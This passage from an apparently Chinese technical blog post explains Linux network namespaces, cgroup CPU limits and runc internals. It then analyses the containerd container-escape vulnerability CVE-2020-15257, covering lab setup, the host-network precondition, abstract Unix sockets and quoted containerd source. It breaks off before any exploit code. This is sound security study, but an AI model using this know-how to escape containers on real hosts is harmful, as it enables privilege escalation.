veth706734a@if16: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP mode DEFAULT group default</span><br><span class="line">    link/ether f6:59:f6:3a:5b:68 brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br></pre></td></tr></table></figure><p>ip命令自带网络空间隔离功能，我们可以通过如下命令来做一个Docker桥接网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 先增加一个网桥lxcbr0，模仿docker0</span></span><br><span class="line">brctl addbr lxcbr0</span><br><span class="line">brctl stp lxcbr0 off</span><br><span class="line"><span class="comment"># 为网桥设置IP地址</span></span><br><span class="line">ip addr add 192.168.10.1/24 dev lxcbr0 </span><br><span class="line">ip link <span class="built_in">set</span> dev lxcbr0 up</span><br><span class="line"></span><br><span class="line"><span class="comment">## 创建一个 network namespace - ns1</span></span><br><span class="line"><span class="comment"># 增加一个 namesapce 命令为 ns1</span></span><br><span class="line">ip netns add ns1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活namespace中的loopback，即127.0.0.1（使用ip netns exec ns1来操作ns1中的命令）</span></span><br><span class="line">ip netns <span class="built_in">exec</span> ns1 ip link <span class="built_in">set</span> dev lo up </span><br><span class="line"></span><br><span class="line"><span class="comment">## 然后，我们需要增加一对虚拟网卡</span></span><br><span class="line"><span class="comment"># 增加一个对虚拟网卡，注意其中的veth类型，其中一个网卡要放到容器（命名空间）中</span></span><br><span class="line">ip link add veth-ns1 <span class="built_in">type</span> veth peer name lxcbr0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把 veth-ns1 放入 namespace ns1中，这样容器中就会有一个新的网卡了，并且宿主机的 veth-ns1 网卡会消失</span></span><br><span class="line">ip link <span class="built_in">set</span> veth-ns1 netns ns1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把容器里的 veth-ns1改名为 eth0 （容器外会冲突，容器内就不会了）</span></span><br><span class="line">ip netns <span class="built_in">exec</span> ns1  ip link <span class="built_in">set</span> dev veth-ns1 name eth0 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 为容器中的网卡分配一个IP地址，并激活它</span></span><br><span class="line">ip netns <span class="built_in">exec</span> ns1 ip addr add 192.168.10.11/24 dev eth0</span><br><span class="line">ip netns <span class="built_in">exec</span> ns1 ip link <span class="built_in">set</span> dev eth0 up</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面我们把veth-ns1这个网卡放入容器中，这里我们把lxcbr0.1添加上网桥上</span></span><br><span class="line">brctl addif lxcbr0 lxcbr0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这步激活不能忘了, 否则会因 lxcbr0 网桥这边的 veth 为启用导致命名空间内检测不到另外一端</span></span><br><span class="line"><span class="comment"># 谢谢向磊哥帮忙看了下，一开始没加这句，导致网络一直不通，自己排查了挺久没发现</span></span><br><span class="line">ip link <span class="built_in">set</span> dev lxcbr0.1 up</span><br></pre></td></tr></table></figure><p>可以通过 <code>brctl show</code> 命令查看网桥接入的网卡情况，并且可以通过执行 <code>ip netns exec ns1 ping 192.168.10.1</code> 测试命名空间内的网络是否与lxcbr0网桥正常通信</p><p>要想容器内访问外部网络，需要添加路由，需要域名解析需要添加dns解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为容器增加一个路由规则，让容器可以访问外面的网络</span></span><br><span class="line">ip netns <span class="built_in">exec</span> ns1 ip route add default via 192.168.10.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在/etc/netns下创建network namespce名称为ns1的目录，</span></span><br><span class="line"><span class="comment"># 然后为这个namespace设置resolv.conf，这样，容器内就可以访问域名了</span></span><br><span class="line">mkdir -p /etc/netns/ns1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> &gt; /etc/netns/ns1/resolv.conf</span><br></pre></td></tr></table></figure><p>如果在虚拟机内还需要设置网卡为混杂模式</p><h3 id="CGroups-Namespace-15"><a href="#CGroups-Namespace-15" class="headerlink" title="CGroups Namespace[15]"></a>CGroups Namespace<sup>[15]</sup></h3><p>推荐阅读 <a href="https://segmentfault.com/a/1190000006917884">Cgroup概述</a><sup>[16]</sup></p><blockquote><p>cgroup是Linux下的一种将进程按组进行管理的机制，在用户层看来，cgroup技术就是把系统中的所有进程组织成一颗一颗独立的树，每棵树都包含系统的所有进程，树的每个节点是一个进程组，而每颗树又和一个或者多个subsystem关联，树的作用是将进程分组，而subsystem的作用就是对这些组进行操作</p></blockquote><p>cgroups (control groups) 主要包括 subsystem 和 hierarchy 两部分</p><p>1个subsystem就是一个内核模块，目前Linux支持下面12种subsystem</p><ul><li><a href="https://link.segmentfault.com/?enc=iZbezHRFyj6bg1d/E2WmVg==.QzwzZwFrk1EUxvpbLRE1wE0cnmEl3padAEwCxP1vaoNdULT5LDjbBD4xtMbNOrq9zShS8ZuXYhVDb2Gvg6a4sqyWwYP5yfY5pcfGs+EG+rI=">cpu</a> (since Linux 2.6.24; CONFIG_CGROUP_SCHED)<br>用来限制cgroup的CPU使用率。</li><li><a href="https://link.segmentfault.com/?enc=XZNdbnGe4XiDvxdzTXvOog==.IYfJ6NauHBhNr0EWOfbs3/cGpDOe33d6Yu1+aT68qXioIUtDuF6AcTikdCQCo3XvkM4G4biqhEnRMjWv8F9Djw==">cpuacct</a> (since Linux 2.6.24; CONFIG_CGROUP_CPUACCT)<br>统计cgroup的CPU的使用率。</li><li><a href="https://link.segmentfault.com/?enc=mLjiP7srCfGvFIfxdbg0OA==.wlroTp3re+Cfqy1LVkwn67DQMj6vn7+ki28CitTS/4Pd8kbxWbHA5uxUujUZfpukB9cKNeeIT4T/T8+eMRVZDw==">cpuset</a> (since Linux 2.6.24; CONFIG_CPUSETS)<br>绑定cgroup到指定CPUs和NUMA节点。</li><li><a href="https://link.segmentfault.com/?enc=yPz1md2lLDULp1fkjvUNOQ==.Dt14rgEPKW3Zrh6DWSoSYbKeBbBtU+k6QNjb8rVkuH2hfw+ETns50i2oCoOuoU6CEw2FdFVtVi4baxJsmFGdZw==">memory</a> (since Linux 2.6.25; CONFIG_MEMCG)<br>统计和限制cgroup的内存的使用率，包括process memory, kernel memory, 和swap。</li><li><a href="https://link.segmentfault.com/?enc=Eg+IwIflPxLek3ixFhhedA==.AwGcN0e8YW4PXb4HwYyrCxjQxHcOQeNucKjEla0hnRC3rxplnOD/dlDoLBDg1elJG9OgcJ9xwm+EJDeLtOyd/Q==">devices</a> (since Linux 2.6.26; CONFIG_CGROUP_DEVICE)<br>限制cgroup创建(mknod)和访问设备的权限。</li><li><a href="https://link.segmentfault.com/?enc=FNaa1E8yTv76bS38QiJXjg==.R7nrfokVmAcav2tpLgJRfsR73vmIkhUOPpSgX85JawQobLoCiDfSBkhk37Eeq8uQ5vdp6UQEWzn43Dk2l3r25wy6aRB8Hnpxp1DR0ocrxk4=">freezer</a> (since Linux 2.6.28; CONFIG_CGROUP_FREEZER)<br>suspend和restore一个cgroup中的所有进程。</li><li><a href="https://link.segmentfault.com/?enc=6hTQcqBtf8vkdl0Tq8/wiw==.X7IfZd94EeSz51Fsttpze+BaOkDUlDzf/TorJqePnV8tJUku9pOil4dsgXAQoZV26X7qaLHBsXIhFswX4FVlyA==">net_cls</a> (since Linux 2.6.29; CONFIG_CGROUP_NET_CLASSID)<br>将一个cgroup中进程创建的所有网络包加上一个classid标记，用于<a href="https://link.segmentfault.com/?enc=56wjmzvdiE9fEwufY9vKDA==.BIV/nd7RynWgx9eIw5DM78DbBsFpV7pGavj2QQmuPQix9Gk7pByFO1BfqkE42XYL">tc</a>和iptables。 只对发出去的网络包生效，对收到的网络包不起作用。</li><li><a href="https://link.segmentfault.com/?enc=4nv5DYZCH3YuMFLYSgBjcA==.x+g1iviA/RPFrPwCcj2dB/kloiHKO5UFJASH7nWbvspKOYq7pf8GlWnBYTodrczrzHJA0qP5tR/cvVPtACk7Cpzj5OII9NJC9qzvsJnRD0Y=">blkio</a> (since Linux 2.6.33; CONFIG_BLK_CGROUP)<br>限制cgroup访问块设备的IO速度。</li><li><a href="https://link.segmentfault.com/?enc=mYLgQ3J4ZTWO4rRZKu4L1g==.lrbWIoXPa0WB9Cewo2XWyKQOCdZqKoy9u9rXFKRk7PLHVOQElXh1dNjfBLQEz/1On1kMpwAo6X+UEz3rfDX9fQ==">perf_event</a> (since Linux 2.6.39; CONFIG_CGROUP_PERF)<br>对cgroup进行性能监控</li><li><a href="https://link.segmentfault.com/?enc=0E+2z5U4HQojgIUugNKWNw==.BwHTl+lVoJkkJYCNyVBH/K1YIcZmHkOq3xr8YEywMuokRLwjXIRbKbzwvYoTYmM7nmP2tmzFvPEiBJhImzGRYQ==">net_prio</a> (since Linux 3.3; CONFIG_CGROUP_NET_PRIO)<br>针对每个网络接口设置cgroup的访问优先级。</li><li><a href="https://link.segmentfault.com/?enc=vt4mOTkg0k8XPdg7VqxAIA==.JEESmfgGixTSxfrsr1oEOmCiAQQp8aZ5qth+nHaQx6AXlhK/GdSjDc64OnuEFzYaDqlP5v2lwpuqPMJMYxYrRw==">hugetlb</a> (since Linux 3.5; CONFIG_CGROUP_HUGETLB)<br>限制cgroup的huge pages的使用量。</li><li><a href="https://link.segmentfault.com/?enc=Yg6DuLJHq991+Qk64TOoPQ==.QjcTVb/Up+wmUAqLP6ucOnAXAmP6OMIl2iLvGTN01s8Wotm1MLfTmKPN7FKbPJStGTeBH/nQcyNjQPRrTymArw==">pids</a> (since Linux 4.3; CONFIG_CGROUP_PIDS)<br>限制一个cgroup及其子孙cgroup中的总进程数。</li></ul><p>1个hierarchy可以理解为1颗cgroup树</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/cgroups</span><br><span class="line">mount | grep cgroup</span><br></pre></td></tr></table></figure><p>查看当前系统支持的subsystem和当前系统已经挂载的subsystem</p><p>这里先关注 cpu 的，进入 cpu subsystem目录，创建一个组名为 tari 的cgroup，并查看当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /sys/fs/cgroup/cpu &amp;&amp; mkdir tari &amp;&amp; ll tari</span><br></pre></td></tr></table></figure><p>发现在subsystem创建目录会生成一些默认文件，通过控制文件里的数值，从而对资源进行限制。</p><p>如果往 <code>cpu.cfs_quota_us</code>文件写入<code>100000</code>（十万），就限制 <code>tari</code> 的cgroup<code>最多</code>能够使用<code>1核</code>的CPU（因为<code>cpu.cfs_period_us</code>配置文件默认把1核cpu分成了10万份）。写入<code>20000</code>，证明最多使用使用<code>1/5</code>核的CPU。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 20000 &gt; /sys/fs/cgroup/cpu/tari/cpu.cfs_quota_us</span><br></pre></td></tr></table></figure><p>首先，新起一个进程，运行</p><p><img src="/img/linux-namespace/63a1a80a98e634d5d54d872cf896865df61efa33.png" class="lazyload" data-srcset="/img/linux-namespace/63a1a80a98e634d5d54d872cf896865df61efa33.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5570"></p><p>CPU 占用率为 100%，这时把 PID 16336 加入 tari cgroup</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 16336 &gt; /sys/fs/cgroup/cpu/tari/tasks</span><br></pre></td></tr></table></figure><p><img src="/img/linux-namespace/d50634ff6620197b2035ae5582de5947554c7568.png" class="lazyload" data-srcset="/img/linux-namespace/d50634ff6620197b2035ae5582de5947554c7568.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5572"></p><p>可以看到CPU占用率为20%左右，其实从写入的配置文件名 cpu.cfs_quota_us 也易知是 CPU 配额，容器里的配额其实也是这么一回事，对于其他资源的限制，也是类似的思路</p><p>Docker 也是通过这种方式实现对容器进行资源隔离<sup>[17]</sup></p><p>默认Docker启动一个容器后会在 <code>/sys/fs/cgroup</code> 目录下的各个subsystem目录生成以容器ID为名字的目录，如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sys/fs/cgroup/cpu/docker/4a9df9dcac71e4475838e207e932a793faa034c1eb7bb7b75786ca5a1308c436</span><br></pre></td></tr></table></figure><h2 id="Docker中命名空间隔离的实现"><a href="#Docker中命名空间隔离的实现" class="headerlink" title="Docker中命名空间隔离的实现"></a>Docker中命名空间隔离的实现</h2><p>Docker 底层即 runc：<a href="https://github.com/opencontainers/runc">https://github.com/opencontainers/runc</a></p><p>src/github.com/opencontainers/runc/init.go</p><p><code>import (&quot;... _ &quot;github.com/opencontainers/runc/libcontainer/nsenter&quot; ...&quot;)</code></p><p>-&gt;</p><p>src/github.com/opencontainers/runc/libcontainer/nsenter/nsenter.go <code>__attribute__((constructor)) init(void)</code> 的 <code>nsexec();</code> 这段 cgo 利用 gcc constructor 特性让这段C代码先于Go的runtime启动之前执行</p><p>nsenter_gccgo.go 中的 if AlwaysFalse 条件一开始我以为是会某种条件满足，实际并不用管，这只是如注释所说为了编译器可以成功编译它，正在是通过 <code>__attribute__</code> 特殊构造函数调的</p><p>-&gt;</p><p>nsexec.c <code>nsexec();</code> 实现命名空间和资源隔离的核心代码，与我们在 User Namespace 改进后的代码有几分相似</p><p>因为Docker需要支持rootless等场景下的命名空间隔离，此外由表1知一些老的内核版本不一定支持或实现了较新的（如 USER）命名空间。Docker为了更高的可拓展性，不能直接像在 【C实现命名空间隔离实验】 小节一样把相应的标志位置于 <code>clone</code> 函数内，所以 Docker 结合 clone、unshare和setns实现。</p><p>因个人对 runc 和 docker 之间的交互逻辑目前处于一种看懂状态，感觉别人讲的更好，推荐阅读 <a href="https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA">runc源码分析</a> <sup>[18]</sup></p><p>想进一步了解Docker，推荐阅读 <a href="https://www.cnblogs.com/sammyliu/category/882904.html">理解Docker系列文章</a><sup>[19]</sup></p><h2 id="命名空间隔离不当漏洞-CVE-2020-15257"><a href="#命名空间隔离不当漏洞-CVE-2020-15257" class="headerlink" title="命名空间隔离不当漏洞 CVE-2020-15257"></a>命名空间隔离不当漏洞 CVE-2020-15257</h2><p>该漏洞是 containerd 层导致的，可参照 <a href="https://tari.moe/p/2022/goland-docker-debug">Docker (远程) Debug 调试环境搭建 - TARI TARI</a> -  0x02 Docker架构组成 部分</p><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><p>环境部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metarget cnv install cve-2020-15257</span><br></pre></td></tr></table></figure><p>漏洞影响版本</p><ul><li>containerd 1.3.x, 1.2.x, 1.4.x版本</li></ul><p>复现组件版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu /o/metarget<span class="comment"># docker -v</span></span><br><span class="line">Docker version 18.03.1-ce, build 9ee9f40</span><br><span class="line">root@ubuntu /o/metarget<span class="comment"># containerd -v</span></span><br><span class="line">containerd github.com/containerd/containerd 1.5.5-0ubuntu3~18.04.2</span><br><span class="line">root@ubuntu /o/metarget<span class="comment"># runc -v</span></span><br><span class="line">runc version 1.0.1-0ubuntu2~18.04.1</span><br><span class="line">spec: 1.0.2-dev</span><br><span class="line">go: go1.13.8</span><br><span class="line">libseccomp: 2.5.1</span><br></pre></td></tr></table></figure><p>利用条件</p><p>网络模式为host的情况下，即容器启动时指定 <code>--net=host</code> 参数</p><p>漏洞描述</p><blockquote><p>Access controls for the shim’s API socket verified that the connecting process had an effective UID of 0, but did not otherwise restrict access to the abstract Unix domain socket. This would allow malicious containers running in the same network namespace as the shim, with an effective UID of 0 but otherwise reduced privileges, to cause new processes to be run with elevated privileges.</p></blockquote><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="Unix套接字"><a href="#Unix套接字" class="headerlink" title="Unix套接字"></a>Unix套接字</h4><p>在Linux系统中，可通过Unix域套接字在同一个主机上的进程之间进行通信，它的API调用方法和普通的TCP/IP的套接字一样，也是调用socket函数创建一个套接字，域设置成AF_UNIX</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(AF_UNIX, SOCK_STREAM 或 SOCK_DGRAM, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在调用socket()函数获得新创建的Unix域套接字的文件描述符之后，再调用bind()函数将它绑定到一个本地地址上，此时需要创建并初始化一个sockaddr_un结构体，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> &#123;</span> </span><br><span class="line">    <span class="keyword">sa_family_t</span> sun_family; </span><br><span class="line">    <span class="keyword">char</span> sun_path[<span class="number">108</span>]; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个字段 <code>sa_family_t</code> 需要设置成 <code>AF_UNIX</code>，第二个字段 <code>sun_path</code> 表示的是一个路径名，它分为两种：</p><ul><li>普通的文件路径：</li></ul><p>它是一个合法的Linux文件路径，以<code>NULL</code>结尾。在绑定一个Unix域套接字时，会在文件系统中的相应位置上创建一个文件，当不再需要这个Unix域套接字时，可以使用remove()函数或者unlink()函数将这个对应的文件删除。<strong>如果在文件系统中，已经有了一个文件和指定的路径名相同，则绑定会失败</strong>。</p><ul><li>抽象名字空间路径：</li></ul><p>抽象名字空间路径以<code>NULL</code>开始，后面可以跟任何数据，甚至可以是<code>NULL</code>，可以不以<code>NULL</code>结尾。相对于普通的文件路径，这种地址在文件系统上并没有实际的文件与它相对应。</p><p>也就是说，<strong>它不会在文件系统中创建出一个新的文件。在Unix域套接字的文件描述符关闭的时候就会自动消失，所以无需担心与文件系统中已存在的文件产生命名冲突，也不需要在使用完套接字之后删除附带产生的这个文件</strong>。</p><h4 id="docker网络模式"><a href="#docker网络模式" class="headerlink" title="docker网络模式"></a>docker网络模式</h4><p>在使用docker run命令创建并运行容器时，可以使用–network选项指定容器的网络模式。</p><p>Docker有以下4种网络模式：</p><ul><li>none：这种模式下容器内部只有loopback回环网络，没有其他网卡，不能访问外网，完全封闭的网络；</li><li>container：指定一个已经存在的容器名字，新的容器会和这个已经存在的容器共享一个网络命名空间，IP、端口范围也一起在这两个容器中共享；</li><li>bridge：这是docker默认的网络模式，会为每一个容器分配网络命名空间，设置IP，保证容器内的进程使用独立的网络环境，使得容器和容器之间、容器和主机之间实现网络隔离；</li><li>host：这种模式下，容器和主机已经没有网络隔离了，它们共享同一个网络命名空间，容器的网络配置和主机完全一样，使用主机的IP地址和端口，可以查看到主机所有网卡信息、网络资源，在网络性能上没有损耗。</li></ul><p>但也正是因为没有网络隔离，容器和主机容易产生网络资源冲突、争抢，以及其他的一些问题。本文所述漏洞也是在这种模式下产生的。</p><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>每次启动一个容器时，containerd会创建一个新的containerd-shim进程，由containerd-shim进程（而不是containerd）来直接控制容器的整个生命周期。</p><p>containerd在创建containerd-shim之前，会创建一个Unix域套接字，设置的是抽象名字空间路径：</p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/linux/bundle.go#L136">https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/linux/bundle.go#L136</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *bundle)</span> <span class="title">shimAddress</span><span class="params">(namespace  <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    d := sha256.Sum256([]<span class="keyword">byte</span>(filepath.Join(namespace,  b.id)))</span><br><span class="line">    <span class="keyword">return</span>  filepath.Join(<span class="keyword">string</span>(filepath.Separator), <span class="string">&quot;containerd-shim&quot;</span>,  fmt.Sprintf(<span class="string">&quot;%x.sock&quot;</span>, d))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/client/client.go">containerd/client.go at v1.4.2 · containerd/containerd · GitHub</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithStart</span><span class="params">(binary, address, daemonAddress, cgroup <span class="keyword">string</span>, debug <span class="keyword">bool</span>, exitHandler <span class="keyword">func</span>()</span>) <span class="title">Opt</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, config shim.Config)</span> <span class="params">(_ shimapi.ShimService, _ io.Closer, err error)</span></span> &#123;</span><br><span class="line">    socket, err := newSocket(address)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> socket.Close()</span><br><span class="line">    f, err := socket.File()</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    cmd, err := newCommand(binary, daemonAddress, debug, config, f, stdoutLog, stderrLog)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := cmd.Start(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, errors.Wrapf(err, <span class="string">&quot;failed to start shim&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newCommand</span><span class="params">(binary, daemonAddress <span class="keyword">string</span>, debug <span class="keyword">bool</span>, config shim.Config, socket *os.File, stdout, stderr io.Writer)</span> <span class="params">(*exec.Cmd, error)</span></span> &#123;</span><br><span class="line">  selfExe, err := os.Executable()</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">  &#125;</span><br><span class="line">  args := []<span class="keyword">string</span>&#123;</span><br><span class="line">    <span class="string">&quot;-namespace&quot;</span>, config.Namespace,</span><br><span class="line">    <span class="string">&quot;-workdir&quot;</span>, config.WorkDir,</span><br><span class="line">    <span class="string">&quot;-address&quot;</span>, daemonAddress,</span><br><span class="line">    <span class="string">&quot;-containerd-binary&quot;</span>, selfExe,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  cmd := exec.Command(binary, args...)</span><br><span class="line">  ...</span><br><span class="line">  cmd.ExtraFiles = <span class="built_in">append</span>(cmd.ExtraFiles, socket)</span><br><span class="line">  cmd.Env = <span class="built_in">append</span>(os.Environ(), <span class="string">&quot;GOMAXPROCS=2&quot;</span>)</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newSocket</span><span class="params">(address <span class="keyword">string</span>)</span> <span class="params">(*net.UnixListener, error)</span></span> &#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(address) &gt; <span class="number">106</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, errors.Errorf(<span class="string">&quot;%q: unix socket path too long (&gt; 106)&quot;</span>, address)</span><br><span class="line">  &#125;</span><br><span class="line">  l, err := net.Listen(<span class="string">&quot;unix&quot;</span>, <span class="string">&quot;\x00&quot;</span>+address)</span><br></pre></td></tr></table></figure><p>注意最后一行中，address前面加上了一个<code>\x00</code>，这个就表示<strong>抽象名字空间路径的Unix域套接字</strong>。</p><p>containerd传递Unix域套接字文件描述符给containerd-shim。containerd-shim在正式启动之后，会基于父进程（也就是containerd）传递的Unix域套接字文件描述符，建立gRPC服务，对外暴露一些API用于container、task的控制： <a href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto#L18">containerd/shim.proto at v1.4.2 · containerd/containerd · GitHub</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">service  Shim &#123;</span><br><span class="line">    <span class="comment">// State returns shim and task state  information.</span></span><br><span class="line">    rpc State(StateRequest) returns  (StateResponse);</span><br><span class="line">    rpc Create(CreateTaskRequest) returns  (CreateTaskResponse);</span><br><span class="line">    rpc Start(StartRequest) returns  (StartResponse);</span><br><span class="line">    rpc Delete(google.protobuf.Empty) returns  (DeleteResponse);</span><br><span class="line">    rpc DeleteProcess(DeleteProcessRequest)  returns (DeleteResponse);</span><br><span class="line">    rpc ListPids(ListPidsRequest) returns  (ListPidsResponse);</span><br><span class="line">    rpc Pause(google.protobuf.Empty) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc Resume(google.protobuf.Empty) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc Checkpoint(CheckpointTaskRequest)  returns (google.protobuf.Empty);</span><br><span class="line">    rpc Kill(KillRequest) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc Exec(ExecProcessRequest) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc ResizePty(ResizePtyRequest) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc CloseIO(CloseIORequest) returns  (google.protobuf.Empty);</span><br><span class="line">    <span class="comment">// ShimInfo returns information about the  shim.</span></span><br><span class="line">    rpc ShimInfo(google.protobuf.Empty)  returns (ShimInfoResponse);</span><br><span class="line">    rpc Update(UpdateTaskRequest) returns  (google.protobuf.Empty);</span><br><span class="line">    rpc Wait(WaitRequest) returns (WaitResponse);</span><br><span 